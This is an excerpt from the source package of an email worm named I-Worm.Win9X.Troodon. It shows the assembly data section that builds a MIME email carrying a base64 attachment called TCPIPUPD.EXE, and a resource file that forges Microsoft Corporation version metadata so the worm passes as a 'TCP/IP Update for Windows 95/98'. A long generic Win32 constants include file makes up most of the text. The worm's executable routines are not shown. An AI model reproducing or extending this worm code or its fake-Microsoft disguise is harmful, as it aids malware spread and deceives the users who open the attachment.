myMultipartMixed		db	'Content-Type: multipart/mixed;', 13, 10, 0
myBoundary			db	9, 'boundary="----This_is_created_by_VX_e-mail_service"', 13, 10, 0
myUseBoundary		db	13, 10, '------This_is_created_by_VX_e-mail_service', 13, 10, 0
myAttachHeader		db	'Content-Type: application/x-msdownload;', 13, 10
				db	9, 'name="TCPIPUPD.EXE"', 13, 10
				db	'Content-Transfer-Encoding: base64', 13, 10
				db	'Content-Disposition: attachement;', 13, 10
				db	9, 'filename="TCPIPUPD.EXE"', 13, 10, 13, 10, 0
myEndBoundary		db	13, 10, '------This_is_created_by_VX_e-mail_service--', 13, 10, 0

hWnd				dd	0
WindowHandle		dd	0
ClassName			db	'I-Worm', 0
WindowTitle			db	'Troodon', 0
x				dd	step
y				dd	step
rect:	ISTRUC RECT
	at RECT.left,			dd	0
	at RECT.top,			dd	0
	at RECT.right,			dd	0
	at RECT.bottom,			dd	0
	IEND

WindowClassStruc:
ISTRUC WNDCLASS
	at WNDCLASS.style,            dd    0
	at WNDCLASS.lpfnWndProc,      dd    WndProc
	at WNDCLASS.cbClsExtra,       dd    0
	at WNDCLASS.cbWndExtra,       dd    0
	at WNDCLASS.hInstance,        dd    0
	at WNDCLASS.hIcon,            dd    NULL
	at WNDCLASS.hCursor,          dd    NULL
	at WNDCLASS.hbrBackground,    dd    1
	at WNDCLASS.lpszMenuName,     dd    NULL
	at WNDCLASS.lpszClassName,    dd    ClassName
IEND

WindowMSG:
ISTRUC MSG
	at MSG.hwnd,              	dd    0
	at MSG.message, 		  	dd    0
	at MSG.wParam,            	dd    0
	at MSG.lParam,            	dd    0
	at MSG.time,              	dd    0
IEND

STime:
ISTRUC SYSTEMTIME
	at SYSTEMTIME.wYear,		dw	0
	at SYSTEMTIME.wMonth,		dw	0
	at SYSTEMTIME.wDayOfWeek,	dw	0
	at SYSTEMTIME.wDay,		dw	0
	at SYSTEMTIME.wHour,		dw	0
	at SYSTEMTIME.wMinute,		dw	0
	at SYSTEMTIME.wSecond,		dw	0
	at SYSTEMTIME.wMilliseconds,	dw	0
IEND

copyright			db	'I-Worm.Win9X.Troodon v1.0 Project', 13, 10
				db	'Developed by Clau.', 0

end:
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[TROODON.ASM]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[TROODON.RC]컴�
#define IDI_ICON 100
IDI_ICON ICON <v.ico>

1 VERSIONINFO
FILEVERSION 1,0,0,0
PRODUCTVERSION 1,0,0,0
FILEFLAGSMASK 0x0000003FL
FILEFLAGS 0x0000000BL
FILEOS 0x00010001L
FILETYPE 0x00000001L
FILESUBTYPE 0x00000000L
BEGIN
BLOCK "StringFileInfo"
BEGIN
BLOCK "040904E4"
BEGIN
VALUE "FileDescription","TCP/IP Update for Microsoft Windows 95/98\0"
VALUE "FileVersion", "6.6.6\0"
VALUE "LegalCopyright", "Copyright (C) Microsoft Corp. 1999-2000\0"
VALUE "CompanyName", "Microsoft Corporation\0"
VALUE "InternalName","TCPIPUPD\0"
VALUE "OriginalFilename", "TCPIPUPD.EXE\0"
VALUE "ProductName","Microsoft(R) Windows NT(R) Operating System\0"
VALUE "ProductVersion", "6.6.6\0"
END
END
BLOCK "VarFileInfo"
BEGIN
VALUE "Translation", 0x0409,1252
END
END
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[TROODON.RC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[WIN32N.INC]컴�
; Win32.inc for NASM 1999 version 0.06 by Tamas Kaproncai [tomcat@szif.hu]

; Greetings to everyone on the windows.inc scene:
; Sven B. Schreiber, Philippe Auphelle, Gij, Iczelion,
; Steve Hutchesson, Barry Kauler, Wayne Radburn...

;-----------------------------data types----------------------------------
%define ACHAR         BYTE  ;ansi character
%define ATOM          DWORD ;string atom
%define BOOL          DWORD ;boolean variable
%define COLORREF      DWORD ;rgb color
%define DWORDLONG     QWORD ;long double word
%define GLOBALHANDLE  DWORD ;global handle
%define HACCEL        DWORD ;accelerator handle
%define HANDLE        DWORD ;unspecified handle
%define HBITMAP       DWORD ;bitmap handle
%define HBRUSH        DWORD ;brush handle
%define HCOLORSPACE   DWORD ;color space handle
%define HCURSOR       DWORD ;cursor handle
%define HDC           DWORD ;device context handle
%define HDWP          DWORD ;defer win pos handle
%define HENHMETAFILE  DWORD ;enh. metafile handle
%define HFILE         DWORD ;file handle
%define HFONT         DWORD ;font handle
%define HGLOBAL       DWORD ;global handle
%define HHOOK         DWORD ;hook handle
%define HICON         DWORD ;icon handle
%define HINSTANCE     DWORD ;instance handle
%define HINTERNET     DWORD ;internet handle
%define HLOCAL        DWORD ;local handle
%define HMENU         DWORD ;menu handle
%define HMETAFILE     DWORD ;metafile handle
%define HPALETTE      DWORD ;palette handle
%define HPEN          DWORD ;pen handle
%define HRGN          DWORD ;region handle
%define HRSRC         DWORD ;resource handle
%define HSTR          DWORD ;string handle
%define HTASK         DWORD ;task handle
%define HTREEITEM     DWORD ;tree view item handle
%define HWND          DWORD ;window handle
%define INTEGER       DWORD ;standard integer
%define LOCALHANDLE   DWORD ;local handle
%define LONG          DWORD ;long integer
%define LONGINT       DWORD ;long integer
%define LPARAM        DWORD ;long parameter
%define LPBOOL        DWORD ;long ptr to boolean
%define LPBYTE        DWORD ;long ptr to byte
%define LPCSTR        DWORD ;long ptr to string
%define LPCTSTR       DWORD ;long ptr to string
%define LPCVOID       DWORD ;long ptr to buffer
%define LPDWORD       DWORD ;long ptr to dword
%define LPFN          DWORD ;long ptr to function
%define LPINT         DWORD ;long ptr to integer
%define LPLONG        DWORD ;long ptr to long int
%define LPMSG         DWORD ;long pointer to message
%define LPPAINTSTRUCT DWORD ;long pointer to paint structure
%define LPRECT        DWORD ;long pointer to rectangle
%define LPSTR         DWORD ;long ptr to string
%define LPTSTR        DWORD ;long ptr to string
%define LPVOID        DWORD ;long ptr to buffer
%define LPWORD        DWORD ;long ptr to word
%define LRESULT       DWORD ;long result
%define POINTER       DWORD ;pointer to anything
%define PVOID         DWORD ;pointer to buffer
%define SHORTINT      WORD  ;short integer
%define UINT          DWORD ;unsigned integer
%define WCHAR         WORD  ;unicode character
%define WNDPROC       DWORD ;window procedure
%define WPARAM        DWORD ;word parameter

;-------------------------WindowProc macros-------------------------------

%MACRO StartWindowProc 0
PUSH EBP
MOV EBP,ESP
%DEFINE hwnd EBP+8
%DEFINE uMsg EBP+12
%DEFINE wParam EBP+16
%DEFINE lParam EBP+20
%ENDMACRO

%MACRO EndWindowProc 0
POP EBP
RETN 16
%ENDMACRO

;-------------------------win32api equates-------------------------------
WINAPI equ 1
TRUE equ 1
FALSE equ 0
NULL equ 0
Normal equ 000000h
ReadOnly equ 000001h
Hidden equ 000010h
System equ 000100h
vLabel equ 001000h
SubDir equ 010000h
Archive equ 100000h
Black equ 000000h
Blue equ 0FF0000h
Green equ 00FF00h
Cyan equ 0FFFF00h
Red equ 0000FFh
Magenta equ 0FF00FFh
Yellow equ 00FFFFh
White equ 0FFFFFFh
Gray equ 080808h
ANYSIZE_ARRAY equ 1
INVALID_HANDLE_VALUE equ -1
DELETE equ 10000h
READ_CONTROL equ 20000h
WRITE_DAC equ 40000h
WRITE_OWNER equ 80000h
SYNCHRONIZE equ 100000h
STANDARD_RIGHTS_READ equ READ_CONTROL
STANDARD_RIGHTS_WRITE equ READ_CONTROL
STANDARD_RIGHTS_EXECUTE equ READ_CONTROL
STANDARD_RIGHTS_REQUIRED equ 0F0000h
STANDARD_RIGHTS_ALL equ 1F0000h
SPECIFIC_RIGHTS_ALL equ 0FFFFh
SID_REVISION equ 1
SID_MAX_SUB_AUTHORITIES equ 15
SID_RECOMMENDED_SUB_AUTHORITIES equ 1
SidTypeUser equ 1
SidTypeGroup equ 2
SidTypeDomain equ 3
SidTypeAlias equ 4
SidTypeWellKnownGroup equ 5
SidTypeDeletedAccount equ 6
SidTypeInvalid equ 7
SidTypeUnknown equ 8
SECURITY_NULL_RID equ 0h
SECURITY_WORLD_RID equ 0h
SECURITY_LOCAL_RID equ 0h
SECURITY_CREATOR_OWNER_RID equ 0h
SECURITY_CREATOR_GROUP_RID equ 1h
SECURITY_DIALUP_RID equ 1h
SECURITY_NETWORK_RID equ 2h
SECURITY_BATCH_RID equ 3h
SECURITY_INTERACTIVE_RID equ 4h
SECURITY_SERVICE_RID equ 6h
SECURITY_ANONYMOUS_LOGON_RID equ 7h
SECURITY_LOGON_IDS_RID equ 5h
SECURITY_LOCAL_SYSTEM_RID equ 12h
SECURITY_NT_NON_UNIQUE equ 15h
SECURITY_BUILTIN_DOMAIN_RID equ 20h
DOMAIN_USER_RID_ADMIN equ 1F4h
DOMAIN_USER_RID_GUEST equ 1F5h
DOMAIN_GROUP_RID_ADMINS equ 200h
DOMAIN_GROUP_RID_USERS equ 201h
DOMAIN_GROUP_RID_GUESTS equ 202h
DOMAIN_ALIAS_RID_ADMINS equ 220h
DOMAIN_ALIAS_RID_USERS equ 221h
DOMAIN_ALIAS_RID_GUESTS equ 222h
DOMAIN_ALIAS_RID_POWER_USERS equ 223h
DOMAIN_ALIAS_RID_ACCOUNT_OPS equ 224h
DOMAIN_ALIAS_RID_SYSTEM_OPS equ 225h
DOMAIN_ALIAS_RID_PRINT_OPS equ 226h
DOMAIN_ALIAS_RID_BACKUP_OPS equ 227h
DOMAIN_ALIAS_RID_REPLICATOR equ 228h
SE_GROUP_MANDATORY equ 1h
SE_GROUP_ENABLED_BY_DEFAULT equ 2h
SE_GROUP_ENABLED equ 4h
SE_GROUP_OWNER equ 8h
SE_GROUP_LOGON_ID equ 0C0000000h
FILE_BEGIN equ 0
FILE_CURRENT equ 1
FILE_END equ 2
FILE_FLAG_WRITE_THROUGH equ 80000000h
FILE_FLAG_OVERLAPPED equ 40000000h
FILE_FLAG_NO_BUFFERING equ 20000000h
FILE_FLAG_RANDOM_ACCESS equ 10000000h
FILE_FLAG_SEQUENTIAL_SCAN equ 8000000h
FILE_FLAG_DELETE_ON_CLOSE equ 4000000h
FILE_FLAG_BACKUP_SEMANTICS equ 2000000h
FILE_FLAG_POSIX_SEMANTICS equ 1000000h
CREATE_NEW equ 1
CREATE_ALWAYS equ 2
OPEN_EXISTING equ 3
OPEN_ALWAYS equ 4
TRUNCATE_EXISTING equ 5
PIPE_ACCESS_INBOUND equ 1h
PIPE_ACCESS_OUTBOUND equ 2h
PIPE_ACCESS_DUPLEX equ 3h
PIPE_CLIENT_END equ 0h
PIPE_SERVER_END equ 1h
PIPE_WAIT equ 0h
PIPE_NOWAIT equ 1h
PIPE_READMODE_BYTE equ 0h
PIPE_READMODE_MESSAGE equ 2h
PIPE_TYPE_BYTE equ 0h
PIPE_TYPE_MESSAGE equ 4h
PIPE_UNLIMITED_INSTANCES equ 255
SECURITY_CONTEXT_TRACKING equ 40000h
SECURITY_EFFECTIVE_ONLY equ 80000h
SECURITY_SQOS_PRESENT equ 100000h
SECURITY_VALID_SQOS_FLAGS equ 1F0000h
SP_SERIALCOMM equ 1h
PST_UNSPECIFIED equ 0h
PST_RS232 equ 1h
PST_PARALLELPORT equ 2h
PST_RS422 equ 3h
PST_RS423 equ 4h
PST_RS449 equ 5h
PST_FAX equ 21h
PST_SCANNER equ 22h
PST_NETWORK_BRIDGE equ 100h
PST_LAT equ 101h
PST_TCPIP_TELNET equ 102h
PST_X25 equ 103h
PCF_DTRDSR equ 1h
PCF_RTSCTS equ 2h
PCF_RLSD equ 4h
PCF_PARITY_CHECK equ 8h
PCF_XONXOFF equ 10h
PCF_SETXCHAR equ 20h
PCF_TOTALTIMEOUTS equ 40h
PCF_INTTIMEOUTS equ 80h
PCF_SPECIALCHARS equ 100h
PCF_16BITMODE equ 200h
DLL_PROCESS_DETACH equ 0
DLL_PROCESS_ATTACH equ 1
DLL_THREAD_ATTACH equ 2
DLL_THREAD_DETACH equ 3
SP_PARITY equ 1h
SP_BAUD equ 2h
SP_DATABITS equ 4h
SP_STOPBITS equ 8h
SP_HANDSHAKING equ 10h
SP_PARITY_CHECK equ 20h
SP_RLSD equ 40h
BAUD_075 equ 1h
BAUD_110 equ 2h
BAUD_134_5 equ 4h
BAUD_150 equ 8h
BAUD_300 equ 10h
BAUD_600 equ 20h
BAUD_1200 equ 40h
BAUD_1800 equ 80h
BAUD_2400 equ 100h
BAUD_4800 equ 200h
BAUD_7200 equ 400h
BAUD_9600 equ 800h
BAUD_14400 equ 1000h
BAUD_19200 equ 2000h
BAUD_38400 equ 4000h
BAUD_56K equ 8000h
BAUD_128K equ 10000h
BAUD_115200 equ 20000h
BAUD_57600 equ 40000h
BAUD_USER equ 10000000h
DATABITS_5 equ 1h
DATABITS_6 equ 2h
DATABITS_7 equ 4h
DATABITS_8 equ 8h
DATABITS_16 equ 10h
DATABITS_16X equ 20h
STOPBITS_10 equ 1h
STOPBITS_15 equ 2h
STOPBITS_20 equ 4h
PARITY_NONE equ 100h
PARITY_ODD equ 200h
PARITY_EVEN equ 400h
PARITY_MARK equ 800h
PARITY_SPACE equ 1000h
DTR_CONTROL_DISABLE equ 0h
DTR_CONTROL_ENABLE equ 1h
DTR_CONTROL_HANDSHAKE equ 2h
RTS_CONTROL_DISABLE equ 0h
RTS_CONTROL_ENABLE equ 1h
RTS_CONTROL_HANDSHAKE equ 2h
RTS_CONTROL_TOGGLE equ 3h
GMEM_FIXED equ 0h
GMEM_MOVEABLE equ 2h
GMEM_NOCOMPACT equ 10h
GMEM_NODISCARD equ 20h
GMEM_ZEROINIT equ 40h
GMEM_MODIFY equ 80h
GMEM_DISCARDABLE equ 100h
GMEM_NOT_BANKED equ 1000h
GMEM_SHARE equ 2000h
GMEM_DDESHARE equ 2000h
GMEM_NOTIFY equ 4000h
GMEM_LOWER equ GMEM_NOT_BANKED
GMEM_VALID_FLAGS equ 7F72h
GMEM_INVALID_HANDLE equ 8000h
GMEM_DISCARDED equ 4000h
GMEM_LOCKCOUNT equ 0FFh
GHND equ GMEM_MOVEABLE|GMEM_ZEROINIT
GPTR equ GMEM_FIXED|GMEM_ZEROINIT
LMEM_FIXED equ 0h
LMEM_MOVEABLE equ 2h
LMEM_NOCOMPACT equ 10h
LMEM_NODISCARD equ 20h
LMEM_ZEROINIT equ 40h
LMEM_MODIFY equ 80h
LMEM_DISCARDABLE equ 0F00h
LMEM_VALID_FLAGS equ 0F72h
LMEM_INVALID_HANDLE equ 8000h
LHND equ LMEM_MOVEABLE+LMEM_ZEROINIT
LPTR equ LMEM_FIXED+LMEM_ZEROINIT
NONZEROLHND equ LMEM_MOVEABLE
NONZEROLPTR equ LMEM_FIXED
LMEM_DISCARDED equ 4000h
LMEM_LOCKCOUNT equ 0FFh
DEBUG_PROCESS equ 1h
DEBUG_ONLY_THIS_PROCESS equ 2h
CREATE_SUSPENDED equ 4h
DETACHED_PROCESS equ 8h
CREATE_NEW_CONSOLE equ 10h
NORMAL_PRIORITY_CLASS equ 20h
IDLE_PRIORITY_CLASS equ 40h
HIGH_PRIORITY_CLASS equ 80h
REALTIME_PRIORITY_CLASS equ 100h
CREATE_NEW_PROCESS_GROUP equ 200h
CREATE_NO_WINDOW equ 8000000h
PROFILE_USER equ 10000000h
PROFILE_KERNEL equ 20000000h
PROFILE_SERVER equ 40000000h
MAXLONG equ 7FFFFFFFh
THREAD_BASE_PRIORITY_MIN equ -2
THREAD_BASE_PRIORITY_MAX equ 2
THREAD_BASE_PRIORITY_LOWRT equ 15
THREAD_BASE_PRIORITY_IDLE equ -15
THREAD_PRIORITY_LOWEST equ THREAD_BASE_PRIORITY_MIN
THREAD_PRIORITY_BELOW_NORMAL equ THREAD_PRIORITY_LOWEST+1
THREAD_PRIORITY_NORMAL equ 0
THREAD_PRIORITY_HIGHEST equ THREAD_BASE_PRIORITY_MAX
THREAD_PRIORITY_ABOVE_NORMAL equ THREAD_PRIORITY_HIGHEST-1
THREAD_PRIORITY_ERROR_RETURN equ MAXLONG
THREAD_PRIORITY_TIME_CRITICAL equ THREAD_BASE_PRIORITY_LOWRT
THREAD_PRIORITY_IDLE equ THREAD_BASE_PRIORITY_IDLE
APPLICATION_ERROR_MASK equ 20000000h
ERROR_SEVERITY_SUCCESS equ 0h
ERROR_SEVERITY_INFORMATIONAL equ 40000000h
ERROR_SEVERITY_WARNING equ 80000000h
ERROR_SEVERITY_ERROR equ 0C0000000h
MINCHAR equ 80h
MAXCHAR equ 7Fh
MINSHORT equ 8000h
MAXSHORT equ 7FFFh
MINLONG equ 80000000h
MAXBYTE equ 0FFh
MAXWORD equ 0FFFFh
MAXDWORD equ 0FFFFFFFFh
LANG_NEUTRAL equ 0h
LANG_BULGARIAN equ 2h
LANG_CHINESE equ 4h
LANG_CROATIAN equ 1Ah
LANG_CZECH equ 5h
LANG_DANISH equ 6h
LANG_DUTCH equ 13h
LANG_ENGLISH equ 9h
LANG_FINNISH equ 0Bh
LANG_FRENCH equ 0Ch
LANG_GERMAN equ 7h
LANG_GREEK equ 8h
LANG_HUNGARIAN equ 0Eh
LANG_ICELANDIC equ 0Fh
LANG_ITALIAN equ 10h
LANG_JAPANESE equ 11h
LANG_KOREAN equ 12h
LANG_NORWEGIAN equ 14h
LANG_POLISH equ 15h
LANG_PORTUGUESE equ 16h
LANG_ROMANIAN equ 18h
LANG_RUSSIAN equ 19h
LANG_SLOVAK equ 1Bh
LANG_SLOVENIAN equ 24h
LANG_SPANISH equ 0Ah
LANG_SWEDISH equ 1Dh
LANG_TURKISH equ 1Fh
SUBLANG_NEUTRAL equ 0h
SUBLANG_DEFAULT equ 1h
SUBLANG_SYS_DEFAULT equ 2h
SUBLANG_CHINESE_TRADITIONAL equ 1h
SUBLANG_CHINESE_SIMPLIFIED equ 2h
SUBLANG_CHINESE_HONGKONG equ 3h
SUBLANG_CHINESE_SINGAPORE equ 4h
SUBLANG_DUTCH equ 1h
SUBLANG_DUTCH_BELGIAN equ 2h
SUBLANG_ENGLISH_US equ 1h
SUBLANG_ENGLISH_UK equ 2h
SUBLANG_ENGLISH_AUS equ 3h
SUBLANG_ENGLISH_CAN equ 4h
SUBLANG_ENGLISH_NZ equ 5h
SUBLANG_ENGLISH_EIRE equ 6h
SUBLANG_FRENCH equ 1h
SUBLANG_FRENCH_BELGIAN equ 2h
SUBLANG_FRENCH_CANADIAN equ 3h
SUBLANG_FRENCH_SWISS equ 4h
SUBLANG_GERMAN equ 1h
SUBLANG_GERMAN_SWISS equ 2h
SUBLANG_GERMAN_AUSTRIAN equ 3h
SUBLANG_ITALIAN equ 1h
SUBLANG_ITALIAN_SWISS equ 2h
SUBLANG_NORWEGIAN_BOKMAL equ 1h
SUBLANG_NORWEGIAN_NYNORSK equ 2h
SUBLANG_PORTUGUESE equ 2h
SUBLANG_PORTUGUESE_BRAZILIAN equ 1h
SUBLANG_SPANISH equ 1h
SUBLANG_SPANISH_MEXICAN equ 2h
SUBLANG_SPANISH_MODERN equ 3h
SORT_DEFAULT equ 0h
SORT_JAPANESE_XJIS equ 0h
SORT_JAPANESE_UNICODE equ 1h
SORT_CHINESE_BIG5 equ 0h
SORT_CHINESE_UNICODE equ 1h
SORT_KOREAN_KSC equ 0h
SORT_KOREAN_UNICODE equ 1h
FILE_READ_DATA equ 1h
FILE_LIST_DIRECTORY equ 1h
FILE_WRITE_DATA equ 2h
FILE_ADD_FILE equ 2h
FILE_APPEND_DATA equ 4h
FILE_ADD_SUBDIRECTORY equ 4h
FILE_CREATE_PIPE_INSTANCE equ 4h
FILE_READ_EA equ 8h
FILE_READ_PROPERTIES equ FILE_READ_EA
FILE_WRITE_EA equ 10h
FILE_WRITE_PROPERTIES equ FILE_WRITE_EA
FILE_EXECUTE equ 20h
FILE_TRAVERSE equ 20h
FILE_DELETE_CHILD equ 40h
FILE_READ_ATTRIBUTES equ 80h
FILE_WRITE_ATTRIBUTES equ 100h
FILE_ALL_ACCESS equ STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|1FFh
FILE_GENERIC_READ equ STANDARD_RIGHTS_READ|FILE_READ_DATA|FILE_READ_ATTRIBUTES|FILE_READ_EA|SYNCHRONIZE
FILE_GENERIC_WRITE equ STANDARD_RIGHTS_WRITE|FILE_WRITE_DATA|FILE_WRITE_ATTRIBUTES|FILE_WRITE_EA|FILE_APPEND_DATA|SYNCHRONIZE
FILE_GENERIC_EXECUTE equ STANDARD_RIGHTS_EXECUTE|FILE_READ_ATTRIBUTES|FILE_EXECUTE|SYNCHRONIZE
FILE_SHARE_READ equ 1h
FILE_SHARE_WRITE equ 2h
FILE_ATTRIBUTE_READONLY equ 1h
FILE_ATTRIBUTE_HIDDEN equ 2h
FILE_ATTRIBUTE_SYSTEM equ 4h
FILE_ATTRIBUTE_DIRECTORY equ 10h
FILE_ATTRIBUTE_ARCHIVE equ 20h
FILE_ATTRIBUTE_NORMAL equ 80h
FILE_ATTRIBUTE_TEMPORARY equ 100h
FILE_ATTRIBUTE_COMPRESSED equ 800h
FILE_NOTIFY_CHANGE_FILE_NAME equ 1h
FILE_NOTIFY_CHANGE_DIR_NAME equ 2h
FILE_NOTIFY_CHANGE_ATTRIBUTES equ 4h
FILE_NOTIFY_CHANGE_SIZE equ 8h
FILE_NOTIFY_CHANGE_LAST_WRITE equ 10h
FILE_NOTIFY_CHANGE_SECURITY equ 100h
MAILSLOT_NO_MESSAGE equ -1
MAILSLOT_WAIT_FOREVER equ -1
FILE_CASE_SENSITIVE_SEARCH equ 1h
FILE_CASE_PRESERVED_NAMES equ 2h
FILE_UNICODE_ON_DISK equ 4h
FILE_PERSISTENT_ACLS equ 8h
FILE_FILE_COMPRESSION equ 10h
FILE_VOLUME_IS_COMPRESSED equ 8000h
IO_COMPLETION_MODIFY_STATE equ 2h
IO_COMPLETION_ALL_ACCESS equ STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|3h
DUPLICATE_CLOSE_SOURCE equ 1h
DUPLICATE_SAME_ACCESS equ 2h
ACCESS_SYSTEM_SECURITY equ 1000000h
MAXIMUM_ALLOWED equ 2000000h
GENERIC_READ equ 80000000h
GENERIC_WRITE equ 40000000h
GENERIC_EXECUTE equ 20000000h
GENERIC_ALL equ 10000000h
ACL_REVISION equ 2
ACL_REVISION1 equ 1
ACL_REVISION2 equ 2
ACCESS_ALLOWED_ACE_TYPE equ 0h
ACCESS_DENIED_ACE_TYPE equ 1h
SYSTEM_AUDIT_ACE_TYPE equ 2h
SYSTEM_ALARM_ACE_TYPE equ 3h
HELPINFO_WINDOW equ 1
HELPINFO_MENUITEM equ 2
OBJECT_INHERIT_ACE equ 1h
CONTAINER_INHERIT_ACE equ 2h
NO_PROPAGATE_INHERIT_ACE equ 4h
INHERIT_ONLY_ACE equ 8h
VALID_INHERIT_FLAGS equ 0Fh
SUCCESSFUL_ACCESS_ACE_FLAG equ 40h
FAILED_ACCESS_ACE_FLAG equ 80h
AclRevisionInformation equ 1
AclSizeInformation equ 2
SECURITY_DESCRIPTOR_REVISION equ 1
SECURITY_DESCRIPTOR_REVISION1 equ 1
SECURITY_DESCRIPTOR_MIN_LENGTH equ 20
SE_OWNER_DEFAULTED equ 1h
SE_GROUP_DEFAULTED equ 2h
SE_DACL_PRESENT equ 4h
SE_DACL_DEFAULTED equ 8h
SE_SACL_PRESENT equ 10h
SE_SACL_DEFAULTED equ 20h
SE_SELF_RELATIVE equ 8000h
SE_PRIVILEGE_ENABLED_BY_DEFAULT equ 1h
SE_PRIVILEGE_ENABLED equ 2h
SE_PRIVILEGE_USED_FOR_ACCESS equ 80000000h
PRIVILEGE_SET_ALL_NECESSARY equ 1
SecurityAnonymous equ 1
SecurityIdentification equ 2
REG_OPTION_RESERVED equ 0
REG_OPTION_NON_VOLATILE equ 0
REG_OPTION_VOLATILE equ 1
REG_OPTION_CREATE_LINK equ 2
REG_OPTION_BACKUP_RESTORE equ 4
REG_NONE equ 0
REG_SZ equ 1
REG_EXPAND_SZ equ 2
REG_BINARY equ 3
REG_DWORD equ 4
REG_DWORD_LITTLE_ENDIAN equ 4
REG_DWORD_BIG_ENDIAN equ 5
REG_LINK equ 6
REG_MULTI_SZ equ 7
REG_RESOURCE_LIST equ 8
REG_FULL_RESOURCE_DESCRIPTOR equ 9
REG_RESOURCE_REQUIREMENTS_LIST equ 10
REG_CREATED_NEW_KEY equ 1h
REG_OPENED_EXISTING_KEY equ 2h
REG_WHOLE_HIVE_VOLATILE equ 1h
REG_REFRESH_HIVE equ 2h
REG_NOTIFY_CHANGE_NAME equ 1h
REG_NOTIFY_CHANGE_ATTRIBUTES equ 2h
REG_NOTIFY_CHANGE_LAST_SET equ 4h
REG_NOTIFY_CHANGE_SECURITY equ 8h
REG_LEGAL_CHANGE_FILTER equ REG_NOTIFY_CHANGE_NAME|REG_NOTIFY_CHANGE_ATTRIBUTES|REG_NOTIFY_CHANGE_LAST_SET|REG_NOTIFY_CHANGE_SECURITY
REG_LEGAL_OPTION equ REG_OPTION_RESERVED|REG_OPTION_NON_VOLATILE|REG_OPTION_VOLATILE|REG_OPTION_CREATE_LINK|REG_OPTION_BACKUP_RESTORE
KEY_QUERY_VALUE equ 1h
KEY_SET_VALUE equ 2h
KEY_CREATE_SUB_KEY equ 4h
KEY_ENUMERATE_SUB_KEYS equ 8h
KEY_NOTIFY equ 10h
KEY_CREATE_LINK equ 20h
KEY_READ equ STANDARD_RIGHTS_READ|KEY_QUERY_VALUE|KEY_ENUMERATE_SUB_KEYS|KEY_NOTIFY&(-1-SYNCHRONIZE)
KEY_WRITE equ STANDARD_RIGHTS_WRITE|KEY_SET_VALUE|KEY_CREATE_SUB_KEY|SYNCHRONIZE&(-1-SYNCHRONIZE)
KEY_EXECUTE equ KEY_READ
KEY_ALL_ACCESS equ STANDARD_RIGHTS_ALL|KEY_QUERY_VALUE|KEY_SET_VALUE|KEY_CREATE_SUB_KEY|KEY_ENUMERATE_SUB_KEYS|KEY_NOTIFY|KEY_CREATE_LINK&(-1-SYNCHRONIZE)
EXCEPTION_DEBUG_EVENT equ 1
CREATE_THREAD_DEBUG_EVENT equ 2
CREATE_PROCESS_DEBUG_EVENT equ 3
EXIT_THREAD_DEBUG_EVENT equ 4
EXIT_PROCESS_DEBUG_EVENT equ 5
LOAD_DLL_DEBUG_EVENT equ 6
UNLOAD_DLL_DEBUG_EVENT equ 7
OUTPUT_DEBUG_STRING_EVENT equ 8
RIP_EVENT equ 9
EXCEPTION_MAXIMUM_PARAMETERS equ 15
DRIVE_REMOVABLE equ 2
DRIVE_FIXED equ 3
DRIVE_REMOTE equ 4
DRIVE_CDROM equ 5
DRIVE_RAMDISK equ 6
FILE_TYPE_UNKNOWN equ 0h
FILE_TYPE_DISK equ 1h
FILE_TYPE_CHAR equ 2h
FILE_TYPE_PIPE equ 3h
FILE_TYPE_REMOTE equ 8000h
STD_INPUT_HANDLE equ -10
STD_OUTPUT_HANDLE equ -11
STD_ERROR_HANDLE equ -12
NOPARITY equ 0
ODDPARITY equ 1
EVENPARITY equ 2
MARKPARITY equ 3
SPACEPARITY equ 4
ONESTOPBIT equ 0
ONE5STOPBITS equ 1
TWOSTOPBITS equ 2
IGNORE equ 0
INFINITE equ 0FFFFh
CBR_110 equ 110
CBR_300 equ 300
CBR_600 equ 600
CBR_1200 equ 1200
CBR_2400 equ 2400
CBR_4800 equ 4800
CBR_9600 equ 9600
CBR_14400 equ 14400
CBR_19200 equ 19200
CBR_38400 equ 38400
CBR_56000 equ 56000
CBR_57600 equ 57600
CBR_115200 equ 115200
CBR_128000 equ 128000
CBR_256000 equ 256000
CE_RXOVER equ 1h
CE_OVERRUN equ 2h
CE_RXPARITY equ 4h
CE_FRAME equ 8h
CE_BREAK equ 10h
CE_TXFULL equ 100h
CE_PTO equ 200h
CE_IOE equ 400h
CE_DNS equ 800h
CE_OOP equ 1000h
CE_MODE equ 8000h
IE_BADID equ -1
IE_OPEN equ -2
IE_NOPEN equ -3
IE_MEMORY equ -4
IE_DEFAULT equ -5
IE_HARDWARE equ -10
IE_BYTESIZE equ -11
IE_BAUDRATE equ -12
EV_RXCHAR equ 1h
EV_RXFLAG equ 2h
EV_TXEMPTY equ 4h
EV_CTS equ 8h
EV_DSR equ 10h
EV_RLSD equ 20h
EV_BREAK equ 40h
EV_ERR equ 80h
EV_RING equ 100h
EV_PERR equ 200h
EV_RX80FULL equ 400h
EV_EVENT1 equ 800h
EV_EVENT2 equ 1000h
SETXOFF equ 1
SETXON equ 2
SETRTS equ 3
CLRRTS equ 4
SETDTR equ 5
CLRDTR equ 6
RESETDEV equ 7
SETBREAK equ 8
CLRBREAK equ 9
PURGE_TXABORT equ 1h
PURGE_RXABORT equ 2h
PURGE_TXCLEAR equ 4h
PURGE_RXCLEAR equ 8h
LPTx equ 80h
MS_CTS_ON equ 10h
MS_DSR_ON equ 20h
MS_RING_ON equ 40h
MS_RLSD_ON equ 80h
S_QUEUEEMPTY equ 0
S_THRESHOLD equ 1
S_ALLTHRESHOLD equ 2
S_NORMAL equ 0
S_LEGATO equ 1
S_STACCATO equ 2
S_PERIOD512 equ 0
S_PERIOD1024 equ 1
S_PERIOD2048 equ 2
S_PERIODVOICE equ 3
S_WHITE512 equ 4
S_WHITE1024 equ 5
S_WHITE2048 equ 6
S_WHITEVOICE equ 7
S_SERDVNA equ -1
S_SEROFM equ -2
S_SERMACT equ -3
S_SERQFUL equ -4
S_SERBDNT equ -5
S_SERDLN equ -6
S_SERDCC equ -7
S_SERDTP equ -8
S_SERDVL equ -9
S_SERDMD equ -10
